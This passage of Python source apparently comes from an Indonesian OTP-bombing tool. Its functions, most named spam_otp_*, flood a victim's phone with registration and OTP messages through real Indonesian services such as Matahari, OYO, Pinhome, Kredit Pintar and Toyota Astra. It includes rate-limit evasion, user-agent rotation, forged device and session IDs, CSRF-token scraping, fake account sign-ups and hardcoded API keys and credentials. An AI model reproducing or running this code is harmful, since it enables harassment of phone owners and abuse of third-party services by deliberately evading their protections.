            "Tel": msisdn,
            "ReferralCode": "",
            "Source": "",
            "Type": "EXTERNAL",
            "WorkExperience": "Sopir kontrak (Mobil perusahaan di bawah 9 kursi, kendaraan layanan, dll.)",
            "Campaign": "",
            "AffiliateNumber": ""
        }

        resp = requests.post(url, json=payload, headers=headers, timeout=10)

        if resp.status_code == 200:
            try:
                data = resp.json()
                if data.get("code") == 0 and data.get("message") == "Success":
                    return True
            except:
                pass
            return True  # Status 200 = asumsikan sukses
        return False
    except:
        return False
        
def spam_otp_matahari(nomor):
    """
    Matahari: Register + OTP via WhatsApp (Anti Rate Limit)
    Format: 08xxx / 62xxx
    """
    # Format nomor ke 08xxx
    phone_08 = nomor
    if phone_08.startswith("62"):
        phone_08 = "0" + phone_08[2:]
    elif phone_08.startswith("+62"):
        phone_08 = "0" + phone_08[3:]
    elif not phone_08.startswith("0"):
        phone_08 = "0" + phone_08

    # Generate data random yang lebih unik
    rand_suffix = ''.join(random.choices(string.digits, k=5))
    rand_name = "Piky" + ''.join(random.choices(string.ascii_lowercase, k=4))
    rand_email = f"pikxyzz{rand_suffix}@gmail.com"
    rand_pass = "PikyGanz" + ''.join(random.choices(string.ascii_letters + string.digits, k=6))

    url = "https://matahari-backend-prod.matahari.com/api/auth/register"
    
    headers = {
        "Host": "matahari-backend-prod.matahari.com",
        "Connection": "keep-alive",
        "Accept": "application/json, text/plain, */*",
        "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
        "Content-Type": "application/json",
        "Origin": "https://matahari.com",
        "Referer": "https://matahari.com/",
        "User-Agent": random.choice(USER_AGENTS),
        "Sec-Ch-Ua": '"Chromium";v="139", "Not;A-Brand";v="99"',
        "Sec-Ch-Ua-Mobile": "?1",
        "Sec-Ch-Ua-Platform": '"Android"',
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-site"
    }

    payload = {
        "emailAddress": rand_email,
        "name": rand_name,
        "birthDate": f"{random.randint(1980, 2005)}-{random.randint(1, 12):02d}-{random.randint(1, 28):02d}",
        "mobileNumber": phone_08,
        "mobileCountryCode": "",
        "password": rand_pass,
        "genderId": str(random.choice(["1", "2"])),
        "cardNumber": "",
        "marketingCode": "",
        "pickupStoreCode": "",
        "referralCode": "",
        "salesmanId": ""
    }

    try:
        resp = requests.post(url, json=payload, headers=headers, timeout=15)
        
        # Status 200 (Sukses) atau 409 (Conflict / Sudah terdaftar) = OTP tetap dikirim
        if resp.status_code in [200, 409]:
            return True
        return False
    except:
        return False
        
def spam_otp_oyo(nomor):
    try:
        # Format nomor: 088975591796 → 88975591796
        if nomor.startswith("0"):
            phone_only = nomor[1:]
        elif nomor.startswith("62"):
            phone_only = nomor[2:]
        elif nomor.startswith("+62"):
            phone_only = nomor[3:]
        else:
            phone_only = nomor
        
        if len(phone_only) < 9:
            return False

        session = requests.Session()
        
        
        login_url = "https://www.oyorooms.com/login?country=id&retUrl=/id"
        session.get(login_url, timeout=10, 
                    headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36"})

        # Ambil XSRF-TOKEN dari Cookie
        xsrf_token = None
        for cookie in session.cookies:
            if cookie.name == "XSRF-TOKEN":
                xsrf_token = cookie.value
                break
        
        if not xsrf_token:
            return False

        url = "https://www.oyorooms.com/api/pwa/generateotp?locale=en"
        
        
        headers = {
            "Accept": "*/*",
            "Accept-Encoding": "gzip, deflate, br, zstd",
            "Accept-Language": "en",
            "Access-Token": "dUxaRnA5NWJyWFlQYkpQNnEtemo6bzdvX01KLUNFbnRyS3hfdEgyLUE=",
            "Content-Type": "application/json",
            "Cookie": "; ".join([f"{c.name}={c.value}" for c in session.cookies]),  # <-- PAKE COOKIE FRESH
            "Deviceid": "5308bfb64832095b78b8e4850251793e943410",
            "Fingerprint_Hash": "5308bfb64832095b78b8e4850251793e",
            "Loc": "153",
            "Origin": "https://www.oyorooms.com",
            "Referer": "https://www.oyorooms.com/login?country=id&retUrl=/id",
            "Sdata": "eyJrdWQiOls0MDQwMCw2MzgwMCw3ODMwMCw4NTAwMCw2NzAwMCw2NjAwMCw2MjcwMCw1NDUwMCw3MzAwMCw0NzMwMF0sImFjYyI6W10sImd5ciI6W10sInR1ZCI6W10sInRpZCI6W10sImtpZCI6Wzc1NzQ3MDAsMTA2MjAwLDg1MDIwMCw2ODU0MDAsODk4MDAsMTYwNDAwLDEyOTY5OS45OTk5OTk5OTk5OSw2ODMzMDAsMjAxNjAwLDgzNjAwXSwidG12IjpbXX0=",
            "Sec-Ch-Ua": '"Not;A=Brand";v="8", "Chromium";v="150", "Google Chrome";v="150"',
            "Sec-Ch-Ua-Mobile": "?0",
            "Sec-Ch-Ua-Platform": '"Windows"',
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-origin",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36",
            "X-Csrf-Token": xsrf_token,  # <-- PAKE TOKEN FRESH
            "Xsrf-Token": xsrf_token
        }
        
        payload = {
            "phone": phone_only,
            "country_code": "+62",
            "nod": 4
        }
        
        resp = session.post(url, json=payload, headers=headers, timeout=10)
        
        if resp.status_code == 200:
            try:
                data = resp.json()
                if data.get("message") == "success" or data.get("success") == True:
                    return True
                return True
            except:
                return True
        return False

    except:
        return False
        
def spam_otp_internetrakyat_v3(nomor):
    try:
        # Format nomor lokal (08xxx)
        if nomor.startswith("0"):
            phone = nomor
        elif nomor.startswith("62"):
            phone = "0" + nomor[2:]
        elif nomor.startswith("+62"):
            phone = "0" + nomor[3:]
        else:
            phone = "0" + nomor

        session = requests.Session()
        base_url = "https://internetrakyat.id"

        # ===== LANGKAH 1: AMBIL COOKIE FRESH DARI HALAMAN REGISTER =====
        session.get(f"{base_url}/auth/register", timeout=10, 
                    headers={"User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36"})

        # ===== LANGKAH 2: KIRIM OTP =====
        url = f"{base_url}/api/app/auth/send-otp-register"
        headers = {
            "Host": "internetrakyat.id",
            "Accept": "application/json, text/plain, */*",
            "Accept-Encoding": "gzip, deflate, br",
            "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
            "Content-Type": "application/json",
            "Origin": base_url,
            "Referer": f"{base_url}/auth/register",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
            "X-Api-Key": "280999!FTTH",
            "Sec-Ch-Ua": '"Chromium";v="139", "Not;A-Brand";v="99"',
            "Sec-Ch-Ua-Mobile": "?1",
            "Sec-Ch-Ua-Platform": '"Android"',
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-site"
        }

        payload = {
            "phone_number": phone
        }

        resp = session.post(url, json=payload, headers=headers, timeout=15)

        # ===== CEK HASIL =====
        if resp.status_code == 201:  # Created = Sukses
            return True
        return False

    except:
        return False
        
def spam_otp_misteraladin_v2(nomor):
    try:
        # ===== JEDA RANDOM BIAR GAK KENA LIMIT =====
        time.sleep(random.uniform(3.0, 8.0))

        # Format nomor: 08xxx
        if nomor.startswith("0"):
            phone = nomor
        elif nomor.startswith("62"):
            phone = "0" + nomor[2:]
        elif nomor.startswith("+62"):
            phone = "0" + nomor[3:]
        else:
            phone = "0" + nomor

        session = requests.Session()
        base_url = "https://m.misteraladin.com"

        # ===== LANGKAH 1: AMBIL XSRF TOKEN & COOKIE =====
        headers_main = {
            "User-Agent": random.choice(USER_AGENTS),
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8"
        }
        session.get(f"{base_url}/register", headers=headers_main, timeout=10)

        # Ambil XSRF-TOKEN dari Cookie
        xsrf_token = None
        for cookie in session.cookies:
            if cookie.name == "XSRF-TOKEN":
                xsrf_token = cookie.value
                break
        
        if not xsrf_token:
            return False

        headers_api = {
            "Host": "m.misteraladin.com",
            "Accept": "application/json, application/json",
            "Accept-Encoding": "gzip, deflate, br",
            "Accept-Language": "id",
            "Content-Type": "application/json",
            "Origin": base_url,
            "Referer": f"{base_url}/register",
            "User-Agent": random.choice(USER_AGENTS),
            "X-Platform": "web",
            "X-XSRF-TOKEN": xsrf_token
        }

        # ===== LANGKAH 2: KIRIM OTP =====
        url_otp = f"{base_url}/web-api/members/auth/otp-request"
        
        random_name = f"SigmaBoy{random.randint(100,999)}"
        
        payload = {
            "phone_number": phone,
            "phone_number_country_code": 62,
            "fullname": random_name,
            "type": "register",
            "pages": None
        }

        resp = session.post(url_otp, json=payload, headers=headers_api, timeout=15)

        # ===== CEK HASIL =====
        if resp.status_code == 200:
            return True
        return False

    except:
        return False
        
def spam_otp_duniagames(nomor):
    try:
        phone, username = format_nomor(nomor)
        session = requests.Session()
        url = "https://api.duniagames.co.id/api/user/api/v2/user/send-otp"
        headers = {
            "accept": "application/json, text/plain, */*",
            "accept-language": "id",
            "ciam-type": "FR",
            "content-type": "application/json",
            "origin": "https://duniagames.co.id",
            "referer": "https://duniagames.co.id/",
            "sec-ch-ua": '"Chromium";v="107", "Not=A?Brand";v="24"',
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": "Android",
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-site",
            "user-agent": "Mozilla/5.0 (Linux; Android 14; itel A671LC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36",
            "x-device": "1ee352b7-d541-418f-a7b9-82d9358ea6a4"
        }
        payload = {"phoneNumber": phone, "userName": username}
        resp = session.post(url, json=payload, headers=headers, timeout=10)
        return resp.status_code == 200
    except:
        return False

def spam_otp_bonusbelanja(nomor):
    try:
        if nomor.startswith("62"):
            nomor_lokal = "0" + nomor[2:]
        elif nomor.startswith("+62"):
            nomor_lokal = "0" + nomor[3:]
        else:
            nomor_lokal = nomor

        url = "https://www.bonusbelanja.com/api/auth/registration/app"
        headers = {
            "User-Agent": random.choice(USER_AGENTS),
            "Accept": "*/*",
            "Accept-Encoding": "gzip, deflate, br, zstd",
            "Accept-Language": "en-US,en;q=0.9,id;q=0.8,pt;q=0.7",
            "Content-Type": "application/json",
            "Origin": "https://www.bonusbelanja.com",
            "Referer": "https://www.bonusbelanja.com/register/"
        }

        random_name = "user" + str(random.randint(1000, 9999))
        payload = {"phone": nomor_lokal, "name": random_name, "agreeTnc": True, "agreeContact": True}
        resp = requests.post(url, json=payload, headers=headers, timeout=10)
        return resp.status_code == 200
    except:
        return False

def spam_otp_saturdays_fix(nomor):
    try:
        if nomor.startswith("0"):
            phone_62 = "62" + nomor[1:]
        elif nomor.startswith("+62"):
            phone_62 = nomor[1:]
        elif nomor.startswith("62"):
            phone_62 = nomor
        else:
            phone_62 = "62" + nomor

        if phone_62.startswith("62"):
            number_only = phone_62[2:]
        else:
            number_only = phone_62

        url = "https://beta.api.saturdays.com/api/v1/user/otp/send"
        headers = {
            "Accept": "*/*",
            "Accept-Encoding": "gzip, deflate, br, zstd",
            "Accept-Language": random.choice(["en-US,en;q=0.9", "id-ID,id;q=0.9"]),
            "Authorization": "undefined",
            "Content-Type": "application/json",
            "Country-Code": "ID",
            "Currency-Code": "IDR",
            "Device-Type": "mweb",
            "Origin": "https://saturdays.com",
            "Platform": "mweb",
            "Priority": "u=1, i",
            "Referer": "https://saturdays.com/",
            "Sec-Ch-Ua": '"Chromium";v="139", "Not;A-Brand";v="99"',
            "Sec-Ch-Ua-Mobile": "?1",
            "Sec-Ch-Ua-Platform": '"Android"',
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-site",
            "User-Agent": random.choice(USER_AGENTS),
            "X-Api-Key": "GCMUDiuY5a7WvyUNt9n3QztToSHzK7Uj"
        }

        payload = {"number": number_only, "country_code": "+62", "type": ""}
        resp = requests.post(url, json=payload, headers=headers, timeout=10)
        return resp.status_code == 200
    except:
        return False
        
def spam_otp_kreditpintar_v3(nomor):
    try:
        # Format nomor lokal: 085875818570
        if nomor.startswith("0"):
            local = nomor
        elif nomor.startswith("62"):
            local = "0" + nomor[2:]
        elif nomor.startswith("+62"):
            local = "0" + nomor[3:]
        else:
            local = "0" + nomor

        # Format internasional: +6285875818570
        if nomor.startswith("0"):
            international = "+62" + nomor[1:]
        elif nomor.startswith("62"):
            international = "+" + nomor
        elif nomor.startswith("+62"):
            international = nomor
        else:
            international = "+62" + nomor

        session = requests.Session()
        base_url = "https://go.kreditpintar.com"

        # ===== LANGKAH 1: AMBIL COOKIE & UUID DARI HALAMAN LOGIN =====
        login_url = f"{base_url}/OFFICIAL2021/login-otp"
        session.get(login_url, timeout=10,
                    headers={"User-Agent": random.choice(USER_AGENTS)})

        # Generate UUID baru (untuk X-Adv-Uuid)
        import uuid
        x_adv_uuid = str(uuid.uuid4())

        # ===== LANGKAH 2: LOGIN TYPE =====
        url_type = f"{base_url}/api/auth/login-type"
        headers_type = {
            "Host": "go.kreditpintar.com",
            "Accept": "application/json, text/plain, */*",
            "Accept-Encoding": "gzip, deflate, br",
            "Accept-Language": "id",
            "Content-Type": "application/json",
            "Origin": base_url,
            "Referer": f"{base_url}/OFFICIAL2021/login-otp",
            "User-Agent": random.choice(USER_AGENTS),
            "X-Adv-Market-Channel": "Official Website",
            "X-Adv-Uuid": x_adv_uuid,
            "X-App-Version": "APPVERSION_NAME(9999)",
            "X-Os-Type": "WEB",
            "X-User-Agent": "Pintar-ID-Cash (WebAndroid;;id) uuid/{} version/0.1.0".format(x_adv_uuid)
        }
        params_type = {
            "channel": "OFFICIAL2021",
            "lang": "id"
        }
        payload_type = {
            "mobileNumber": local,
            "captcha": ""
        }

        resp_type = session.post(url_type, params=params_type, json=payload_type, headers=headers_type, timeout=10)
        if resp_type.status_code != 200:
            return False

        # ===== LANGKAH 3: SEND OTP =====
        url_otp = f"{base_url}/api/auth/send-code"
        headers_otp = headers_type.copy()
        params_otp = {
            "channel": "OFFICIAL2021",
            "lang": "id"
        }
        payload_otp = {
            "mobileNumber": international,
            "type": "SMS"
        }

        resp_otp = session.post(url_otp, params=params_otp, json=payload_otp, headers=headers_otp, timeout=10)

        if resp_otp.status_code == 200:
            return True
        return False

    except:
        return False
        
def spam_otp_pinhome(nomor):
    try:
        # Format nomor: 85875652185 (tanpa 0/62)
        if nomor.startswith("0"):
            nomor_lokal = nomor[1:]
        elif nomor.startswith("62"):
            nomor_lokal = nomor[2:]
        elif nomor.startswith("+62"):
            nomor_lokal = nomor[3:]
        else:
            nomor_lokal = nomor

        session = requests.Session()
        
        # TAHAP 1: Ambil cookie & CSRF token dari halaman daftar
        url_main = "https://www.pinhome.id/daftar?redirect=%2F"
        headers_main = {
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
            "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
        }
        resp_main = session.get(url_main, headers=headers_main, timeout=10)
        
        # Ekstrak CSRF token dari cookie (biasanya ada di response headers)
        csrf_token = None
        for cookie in session.cookies:
            if cookie.name.startswith("x7kCsrf") or "csrf" in cookie.name.lower():
                csrf_token = cookie.value
                break
        
        # Fallback: kalau gak ketemu, coba dari response text
        if not csrf_token:
            import re
            match = re.search(r'<meta name="csrf-token" content="([^"]+)"', resp_main.text)
            if match:
                csrf_token = match.group(1)

        if not csrf_token:
            # Gunakan token dari screenshot sebagai fallback
            csrf_token = "v4.local.nl5c42EnzpwOHT18H7_-sNACnkB8Uosc_WCBSIXXt790xbNnprFgy_Vwa9W-2Sj7hY_7-u1Z9Eyo0Em8YfLTrkvCLb6VddlzR6npVV1qvJap9g9Fx12Z5S_JkA7sH8HA0nStoQ5u7MeZxA8BBZ3xFGelS45E7Ag-wAhdyp05mEshBqka19hCN9Bnv-UYskCAWEJg-bU000e0cFJD41Z3MZwkwRK_Zb_39ZuGHOaAtEcm0V8"

        # TAHAP 2: Kirim request OTP
        url_otp = "https://www.pinhome.id/api/odyssey/proxy/pinaccount/auth/verification/request-otp"
        headers_otp = {
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
            "Accept": "*/*",
            "Accept-Encoding": "gzip, deflate, br",
            "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
            "Content-Type": "text/plain;charset=UTF-8",
            "Origin": "https://www.pinhome.id",
            "Referer": "https://www.pinhome.id/daftar?redirect=%2F",
            "X-Csrf-Token": csrf_token,
            "Sec-Ch-Ua": '"Chromium";v="139", "Not;A-Brand";v="99"',
            "Sec-Ch-Ua-Mobile": "?1",
            "Sec-Ch-Ua-Platform": '"Android"',
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-origin"
        }
        payload = {
            "accountType": "customers",
            "applicationType": "Pinhome Web",
            "countryCode": "62",
            "medium": "whatsapp",
            "otpType": "register",
            "phoneNumber": nomor_lokal
        }
        
        resp_otp = session.post(url_otp, json=payload, headers=headers_otp, timeout=10)
        
        return resp_otp.status_code == 200
        
    except Exception as e:
        return False
        
def spam_toyota_astra_premium(phone):
    """
    Toyota Astra PREMIUM V2 - 2-Step OTP (Auto Rotate Token + Anti Limit)
    Format input: 08xxx / 62xxx -> otomatis jadi 62xxx
    """
    try:
        import re
        import random
        import time
        import string
        import uuid
        import hashlib

        # ===== 1. Normalisasi nomor ke 62xxx =====
        raw = re.sub(r'\D', '', phone)
        if raw.startswith('0'):
            nomor_clean = '62' + raw[1:]
        elif raw.startswith('62'):
            nomor_clean = raw
        else:
            nomor_clean = '62' + raw

        # ===== 2. Rotasi User-Agent (Biarr gak kelihatan bot) =====
        ua_list = [
            "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
            "Mozilla/5.0 (Linux; Android 11; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Mobile Safari/537.36",
            "Mozilla/5.0 (Linux; Android 12; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Mobile Safari/537.36",
            "Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Mobile Safari/537.36",
            "Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Mobile Safari/537.36"
        ]
        ua = random.choice(ua_list)

        # ===== 3. Generate Fake Device ID (Anti-Fingerprint) =====
        # Palsukan identitas perangkat biar server gak curiga
        fake_device_id = str(uuid.uuid4()).replace('-', '').upper()
        fake_session_id = ''.join(random.choices(string.ascii_letters + string.digits, k=32))

        # ===== 4. Session Baru + Delay Pintar =====
        session = requests.Session()
        time.sleep(random.uniform(1.5, 3.0))  # Jeda random biar gak bot

        # ===== STEP 1: TOKENIZE =====
        tokenize_url = "https://data-web.tam-icm.com/api/public/vendors/tokenize"
        headers_tokenize = {
            "Authorization": "Basic ZGlkeDpUb3lvdGEyMDI0",
            "Content-Type": "application/json",
            "Accept": "application/json",
            "Origin": "https://www.toyota.astra.co.id",
            "Referer": "https://www.toyota.astra.co.id/",
            "User-Agent": ua,
            "X-Device-Id": fake_device_id,  # <-- Identitas palsu
            "X-Session-Id": fake_session_id  # <-- Session palsu
        }
        payload_tokenize = {"data": [nomor_clean]}

        resp_token = session.post(tokenize_url, json=payload_tokenize, headers=headers_tokenize, timeout=15)

        # Cek Step 1: Kalo gagal tokenize, gak usah lanjut
        if resp_token.status_code != 200:
            return False

        # Ambil token dari response JSON
        token = None
        try:
            token_data = resp_token.json()
            # Struktur response: [{"token": "..."}]
            if isinstance(token_data, list) and len(token_data) > 0:
                token = token_data[0].get("token")
        except:
            pass

        if not token:
            return False  # Token gak ditemukan, gagal total

        # ===== STEP 2: REGISTER (KIRIM OTP) =====
        register_url = "https://data-web.tam-icm.com/api/public/vendors/register"
        headers_register = {
            "Host": "data-web.tam-icm.com",
            "sec-ch-ua-platform": '"Android"',
            "User-Agent": ua,
            "Accept": "application/json, text/plain, */*",
            "sec-ch-ua": '"Chromium";v="139", "Not;A-Brand";v="99"',
            "Content-Type": "application/json",
            "sec-ch-ua-mobile": "?1",
            "Origin": "https://www.toyota.astra.co.id",
            "sec-fetch-site": "cross-site",
            "sec-fetch-mode": "cors",
            "sec-fetch-dest": "empty",
            "Referer": "https://www.toyota.astra.co.id/",
            "Accept-Encoding": "gzip, deflate, br, zstd",
            "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
            "X-Device-Id": fake_device_id  # <-- Identitas palsu di Step 2 juga
        }
        payload_register = {"phoneNumber": token}

        resp_register = session.post(register_url, json=payload_register, headers=headers_register, timeout=15)

        # ===== CEK RESPONSE FINAL =====
        if resp_register.status_code == 200:
            try:
                data = resp_register.json()
                # Validasi ketat: cek status success beneran
                if data.get("status") == "success" or data.get("code") == 200:
                    return True
                # Kalo ada error message di response, return False (jangan bohong)
                if "error" in str(data).lower():
                    return False
                # Fallback: status 200 tapi gak ada error = asumsikan sukses
                return True
            except:
                # Kalo response gak bisa di-parse JSON, tapi status 200 = asumsikan sukses
                return True
        return False

    except Exception as e:
        return False